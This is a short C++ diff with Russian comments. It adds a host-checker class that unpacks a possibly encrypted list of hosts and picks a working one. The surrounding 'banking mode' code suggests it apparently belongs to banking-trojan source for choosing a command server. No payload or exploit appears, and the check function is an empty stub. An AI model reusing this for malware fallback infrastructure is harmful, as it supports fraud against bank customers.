@@ -660,3 +660,62 @@ void Hosts::SetBankingMode()
 	    StartThread(BankingModeApdateHostsThread, NULL);
 }
 //---------------------------------------------------------------------------
+
+
+//****************************************************************************
+//                               THostChecker
+//****************************************************************************
+
+void _HostChecker_FreeHost(LPVOID Host)
+{
+	delete (string*)Host;
+}
+
+
+
+THostChecker::THostChecker(const char *Hosts, bool HostsEncrypted)
+{
+	if (AnsiStr::IsEmpty(Hosts))
+		return;
+	FHosts = List::Create();
+    List::SetFreeItemMehod(FHosts, _HostChecker_FreeHost);
+
+	// Распаковываем строки
+	const char* Temp = Hosts;
+	while (*Temp)
+	{
+		string *Host = new string(Temp);
+		List::Add(FHosts, Host);
+
+		// Переходим к следующей строке
+		Temp = STR::End((char*)Temp);
+		Temp++;
+    }
+}
+
+
+THostChecker::~THostChecker()
+{
+    List::Free(FHosts);
+}
+
+
+DWORD WINAPI _HostChecker_Check(THostChecker *Checker)
+{
+
+}
+
+
+void THostChecker::Check()
+{
+	// Функция запускает проверку хостов
+    FThread = StartThread(_HostChecker_Check, this);
+}
+
+string THostChecker::GetWorkHost()
+{
+	//Функция возвращает рабочий хост
+
+	return FWorkHost;
+}
+
